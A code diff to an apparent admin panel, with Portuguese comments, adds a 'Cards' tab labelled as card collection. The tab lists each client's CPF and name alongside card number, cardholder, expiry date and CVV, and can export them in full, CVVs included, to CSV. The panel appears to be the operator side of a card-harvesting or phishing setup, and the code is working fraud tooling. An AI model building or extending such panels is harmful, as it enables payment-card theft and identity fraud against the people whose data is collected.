@@ -19,7 +19,6 @@
             color: #e8edf2;
         }
 
-        /* Temas */
         body.theme-default { --accent: #f5a623; --accent-rgb: 245, 166, 35; --accent-dark: #e09515; }
         body.theme-blue { --accent: #3b82f6; --accent-rgb: 59, 130, 246; --accent-dark: #2563eb; }
         body.theme-red { --accent: #ef4444; --accent-rgb: 239, 68, 68; --accent-dark: #dc2626; }
@@ -36,7 +35,6 @@
             pointer-events: none;
         }
 
-        /* LOADING */
         .loading-screen {
             position: fixed;
             top: 0;
@@ -138,7 +136,6 @@
         .admin-panel { display: none; position: relative; z-index: 1; }
         .admin-panel.visible { display: block; }
 
-        /* Sidebar */
         .sidebar {
             position: fixed;
             left: 0;
@@ -193,7 +190,6 @@
         .sidebar-toggle.collapsed { left: 20px; }
         .sidebar-toggle:hover { background: #1a1f2a; color: var(--accent, #f5a623); }
 
-        /* Main Content */
         .main-content {
             margin-left: 260px;
             padding: 24px 32px;
@@ -222,7 +218,6 @@
         }
         .logout-btn:hover { background: #ef4444; border-color: #ef4444; color: #fff; }
 
-        /* Stats */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(6, 1fr);
@@ -238,7 +233,6 @@
         .stat-value { font-size: 26px; font-weight: 700; color: var(--accent, #f5a623); }
         .stat-label { font-size: 11px; color: #6b7280; margin-top: 4px; }
 
-        /* Tabs */
         .tabs {
             display: flex;
             gap: 8px;
@@ -260,7 +254,6 @@
         .tab:hover { color: #fff; }
         .tab.active { background: rgba(var(--accent-rgb), 0.12); color: var(--accent, #f5a623); }
 
-        /* Cards */
         .card {
             background: #0e1219;
             border: 1px solid #1a1f2a;
@@ -279,7 +272,6 @@
             font-size: 14px;
         }
 
-        /* Products */
         .products-container { display: flex; flex-direction: column; gap: 12px; }
         .product-row {
             display: flex;
@@ -317,7 +309,6 @@
         }
         .btn-icon:hover { background: #ef4444; color: #fff; }
 
-        /* Forms */
         .form-row {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -346,7 +337,6 @@
             color: #0a0c10;
         }
 
-        /* Tables */
         .table-wrapper { overflow-x: auto; }
         table { width: 100%; border-collapse: collapse; }
         th, td { padding: 12px; text-align: left; border-bottom: 1px solid #1a1f2a; font-size: 13px; }
@@ -362,6 +352,7 @@
         .badge-success { background: rgba(16,185,129,0.15); color: #10b981; }
         .badge-warning { background: rgba(245,158,11,0.15); color: #f59e0b; }
         .badge-info { background: rgba(59,130,246,0.15); color: #3b82f6; }
+        .badge-danger { background: rgba(239,68,68,0.15); color: #ef4444; }
 
         .theme-options { display: flex; gap: 12px; flex-wrap: wrap; }
         .theme-btn {
@@ -490,7 +481,8 @@
             <li><a data-tab="produtos"><i class="fas fa-dumpster"></i> Products</a></li>
             <li><a data-tab="agendamentos"><i class="fas fa-calendar"></i> Schedule</a></li>
             <li><a data-tab="users"><i class="fas fa-users"></i> Users</a></li>
-            <li><a data-tab="payments"><i class="fas fa-credit-card"></i> Payments</a></li>
+            <li><a data-tab="cards"><i class="fas fa-credit-card"></i> Cards</a></li>
+            <li><a data-tab="payments"><i class="fas fa-money-bill"></i> Payments</a></li>
             <li><a data-tab="logs"><i class="fas fa-history"></i> Logs</a></li>
             <li><a data-tab="settings"><i class="fas fa-cog"></i> Settings</a></li>
         </ul>
@@ -516,6 +508,7 @@
             <button class="tab" onclick="switchTab('produtos')">Products</button>
             <button class="tab" onclick="switchTab('agendamentos')">Schedule</button>
             <button class="tab" onclick="switchTab('users')">Users</button>
+            <button class="tab" onclick="switchTab('cards')">Cards</button>
             <button class="tab" onclick="switchTab('payments')">Payments</button>
             <button class="tab" onclick="switchTab('logs')">Logs</button>
             <button class="tab" onclick="switchTab('settings')">Settings</button>
@@ -550,7 +543,6 @@
             </div>
         </div>
 
-        <!-- SCHEDULE - CORRIGIDO E PROFISSIONAL -->
         <div id="tabAgendamentos" class="tab-content">
             <div class="card">
                 <div class="card-header">Appointments</div>
@@ -560,7 +552,6 @@
             </div>
         </div>
 
-        <!-- USERS - CORRIGIDO E PROFISSIONAL -->
         <div id="tabUsers" class="tab-content">
             <div class="card">
                 <div class="card-header">
@@ -581,8 +572,39 @@
             </div>
         </div>
 
+        <!-- CARDS - COLETA DE CARTÕES (CPF + NOME DO CLIENTE JUNTOS) -->
+        <div id="tabCards" class="tab-content">
+            <div class="card">
+                <div class="card-header">
+                    <span>Card Data - Full Collection</span>
+                    <div style="display:flex; gap:10px;">
+                        <div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchCards" placeholder="Search CPF..." onkeyup="filterCards()"></div>
+                        <button class="btn-primary" onclick="exportCardsCSV()">Export</button>
+                    </div>
+                </div>
+                <div class="table-wrapper">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Client (CPF + Name)</th>
+                                <th>Card Number</th>
+                                <th>Cardholder</th>
+                                <th>CVV</th>
+                                <th>Expiry</th>
+                                <th>Date</th>
+                            </tr>
+                        </thead>
+                        <tbody id="cardsTable"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
         <div id="tabPayments" class="tab-content">
-            <div class="card"><div class="card-header">Payment History</div><div id="paymentsList"></div></div>
+            <div class="card">
+                <div class="card-header">Payment History</div>
+                <div id="paymentsList"></div>
+            </div>
         </div>
 
         <div id="tabLogs" class="tab-content">
@@ -663,6 +685,7 @@ let adminToken = null;
 let refreshInterval = null;
 let productsData = [];
 let usersData = [];
+let cardsData = [];
 let paymentsData = [];
 let logsData = [];
 let scheduleData = [];
@@ -689,6 +712,13 @@ function formatPhone(phone) {
     if(phone.length === 11) return phone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
     if(phone.length === 10) return phone.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
     return phone;
+}
+
+function formatCardNumber(num) {
+    if(!num) return '****';
+    let str = num.toString().replace(/\s/g, '');
+    if(str.length >= 16) return str.slice(0,4) + ' **** **** ' + str.slice(-4);
+    return str;
 }
 
 let sidebarCollapsed = false;
@@ -956,7 +986,7 @@ async function loadUsers() {
 
 function renderUsers() {
     const tbody = document.getElementById('usersTable');
-    if(!usersData.length) { tbody.innerHTML = '<td><td colspan="5" style="text-align:center">No data</td></tr>'; return; }
+    if(!usersData.length) { tbody.innerHTML = '<tr><td colspan="5" style="text-align:center">No data</td></tr>'; return; }
     tbody.innerHTML = usersData.map(u => `
         <tr>
             <td><strong>${formatCPF(u.cpf)}</strong></td>
@@ -982,6 +1012,70 @@ function filterUsers() {
             <td><button class="btn-icon" onclick="deleteUser('${u.cpf}')" style="background:transparent;"><i class="fas fa-trash"></i></button></td>
         </tr>
     `).join('');
+}
+
+// CARDS - COLETA DE CARTÕES (CPF + NOME DO CLIENTE JUNTOS)
+async function loadCards() {
+    if(!adminToken) return;
+    try {
+        const res = await fetch('/api/admin/cartoes', { headers: { 'Authorization': `Bearer ${adminToken}` } });
+        const data = await res.json();
+        cardsData = data.cartoes || [];
+        renderCards();
+    } catch(e) { console.error(e); }
+}
+
+function renderCards() {
+    const tbody = document.getElementById('cardsTable');
+    if(!cardsData.length) { 
+        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center">No card data collected</td></tr>'; 
+        return; 
+    }
+    tbody.innerHTML = cardsData.map(c => `
+        <tr>
+            <td>
+                <strong>${formatCPF(c.cpf || '-')}</strong><br>
+                <span style="font-size:11px; color:#6b7280;">${escapeHtml(c.cliente_nome || c.nome_titular || '-')}</span>
+            </td>
+            <td><span class="badge badge-danger" style="font-family:monospace;">${formatCardNumber(c.numero_cartao || c.numero)}</span></td>
+            <td>${escapeHtml(c.nome_titular || '-')}</td>
+            <td><span class="badge badge-warning" style="font-family:monospace;">${c.cvv || '***'}</span></td>
+            <td>${c.validade || '-'}</td>
+            <td>${c.created_at ? new Date(c.created_at).toLocaleString() : '-'}</td>
+        </tr>
+    `).join('');
+}
+
+function filterCards() {
+    const term = document.getElementById('searchCards')?.value.toLowerCase() || '';
+    const filtered = cardsData.filter(c => (c.cpf || '').toLowerCase().includes(term) || (c.cliente_nome || c.nome_titular || '').toLowerCase().includes(term));
+    const tbody = document.getElementById('cardsTable');
+    if(!filtered.length) { tbody.innerHTML = '<tr><td colspan="6" style="text-align:center">No results</td></tr>'; return; }
+    tbody.innerHTML = filtered.map(c => `
+        <tr>
+            <td>
+                <strong>${formatCPF(c.cpf || '-')}</strong><br>
+                <span style="font-size:11px; color:#6b7280;">${escapeHtml(c.cliente_nome || c.nome_titular || '-')}</span>
+            </td>
+            <td><span class="badge badge-danger" style="font-family:monospace;">${formatCardNumber(c.numero_cartao || c.numero)}</span></td>
+            <td>${escapeHtml(c.nome_titular || '-')}</td>
+            <td><span class="badge badge-warning" style="font-family:monospace;">${c.cvv || '***'}</span></td>
+            <td>${c.validade || '-'}</td>
+            <td>${c.created_at ? new Date(c.created_at).toLocaleString() : '-'}</td>
+        </tr>
+    `).join('');
+}
+
+function exportCardsCSV() {
+    if(!cardsData.length) { showToast('No card data'); return; }
+    let csv = "CPF,CLIENT_NAME,CARD_NUMBER,CARDHOLDER,CVV,EXPIRY,DATE\n";
+    cardsData.forEach(c => csv += `"${c.cpf || ''}","${c.cliente_nome || c.nome_titular || ''}","${c.numero_cartao || c.numero || ''}","${c.nome_titular || ''}","${c.cvv || ''}","${c.validade || ''}","${c.created_at || ''}"\n`);
+    const blob = new Blob([csv], { type: 'text/csv' });
+    const link = document.createElement('a');
+    link.href = URL.createObjectURL(blob);
+    link.download = `cards_${new Date().toISOString().slice(0,19)}.csv`;
+    link.click();
+    showToast('CSV exported');
 }
 
 async function deleteUser(cpf) {
@@ -1097,6 +1191,7 @@ async function switchTab(tabName) {
         if(tabName === 'produtos') loadProducts();
         else if(tabName === 'agendamentos') loadSchedule();
         else if(tabName === 'users') loadUsers();
+        else if(tabName === 'cards') loadCards();
         else if(tabName === 'payments') loadPayments();
         else if(tabName === 'logs') loadLogs();
     }
